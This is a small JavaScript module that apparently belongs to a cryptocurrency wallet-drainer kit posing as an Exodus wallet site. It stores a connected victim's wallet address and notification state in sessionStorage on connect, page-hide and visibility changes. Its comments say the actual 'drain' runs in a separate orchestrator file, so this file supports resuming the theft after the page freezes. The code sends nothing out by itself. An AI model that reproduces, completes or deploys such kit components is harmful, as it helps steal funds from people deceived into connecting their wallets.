/**
 * Exodus post-connect bridge — state persistence only.
 * Drain is handled exclusively by exodus-connected-ui.js (sole orchestrator).
 * This file only persists address/notify state so resume works after freeze.
 */
(function () {
  'use strict';

  function persistAddr() {
    try {
      var L = window.legion;
      var S = (L && L.state) || {};
      var addr = S.evmAddr ||
        sessionStorage.getItem('legion_wc_evm_addr') ||
        sessionStorage.getItem('exodus_site_connected_addr');
      if (addr) {
        sessionStorage.setItem('exodus_site_connected_addr', String(addr).toLowerCase());
        sessionStorage.setItem('legion_wc_evm_addr', String(addr).toLowerCase());
      }
      if (S.notifyDone || S.connectNotifiedAddr) {
        var notifyAddr = String(addr || S.connectNotifiedAddr || '').toLowerCase();
        sessionStorage.setItem('legion_notify_done', notifyAddr);
      }
    } catch (_) {}
  }

  window.addEventListener('legion:connected', function () {
    persistAddr();
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') persistAddr();
  });

  window.addEventListener('pagehide', function () {
    persistAddr();
  });
})();
